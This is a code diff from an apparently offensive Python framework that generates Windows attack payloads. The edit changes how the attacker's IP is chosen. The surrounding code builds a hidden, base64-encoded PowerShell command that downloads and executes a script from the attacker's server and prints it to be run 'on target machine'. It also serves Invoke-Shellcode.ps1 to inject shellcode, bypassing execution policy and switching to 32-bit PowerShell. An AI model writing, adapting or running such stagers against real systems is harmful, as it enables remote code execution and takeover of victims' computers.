@@ -9,6 +9,7 @@ serverlist = []
 
 def printListener(printit=True):
     from listener import Server
+    from menu import returnIP
     powershellFileName = 'p.ps1'
 
     while True:
@@ -17,7 +18,7 @@ def printListener(printit=True):
             break
     if bindOrReverse == 'r':
         powershellContent = open('lib/powershell/stager.ps1', 'r').read()
-        windows_powershell_stager = powershellContent % ('False', FUNCTIONS().CheckInternet(), '5555')
+        windows_powershell_stager = powershellContent % ('False', returnIP(), '5555')
     if bindOrReverse == 'b':
         powershellContent = open('lib/powershell/stager.ps1', 'r').read()
         windows_powershell_stager = powershellContent % ('True', '', '5556')
@@ -35,8 +36,8 @@ def printListener(printit=True):
         FUNCTIONS().DoServe(manualIP, powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
         stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + manualIP + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
     else:
-        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-        stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
+        FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
+        stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
 
     if printit:
         print t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n'
@@ -142,13 +143,14 @@ def checkUpload():
     return False
 
 def clientUpload(fileToUpload, powershellExec, isExe, json):
+    from menu import returnIP
     clientnumber = checkUpload()
     if clientnumber:
         if isExe:
             newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
             moduleport = FUNCTIONS().randomUnusedPort()
-            FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
-            encPowershell = "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(FUNCTIONS().CheckInternet(), moduleport, newpayloadlayout.rstrip(','))
+            FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
+            encPowershell = "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(returnIP(), moduleport, newpayloadlayout.rstrip(','))
             encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
             fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
             b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
